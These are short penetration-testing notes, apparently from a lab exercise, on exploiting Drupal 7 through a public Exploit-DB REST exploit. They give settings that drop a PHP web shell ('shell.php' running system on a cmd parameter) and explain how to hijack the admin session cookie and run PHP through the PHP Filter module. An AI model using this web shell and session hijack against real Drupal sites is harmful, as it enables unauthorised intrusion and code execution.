# Enum-Web-App-Drupal-Notes

## Exploit Drupal 7

```
https://www.exploit-db.com/exploits/41564
```

- syntax errors on line 16 and 71

## Modify these variables:

```
$url='10.10.10.100';
$endpoint_path='/rest';
$endpoint='rest_endpoint';
$file=[
  'filename'=>'shell.php',
  'data'=>'<?php echo(system($_GET["cmd"])); ?>'
];
```
## Summary

Running the exploit will create the specified PHP file as well as generate user.json and
session.json locally. The session file contains valid cookie data for the Drupal admin user, and it
is possible to directly paste PHP code into a new Drupal module. Logging in as the admin user is
fairly simple and can be achieved by creating a new cookie.

PHP execution can be achieved by enabling the PHP Filter module on the Modules page.
Afterwards, simply browse to Add content then to Article. Pasting PHP into the article body,
changing the Text format to PHP code and then clicking on Preview allows for easy code
execution.
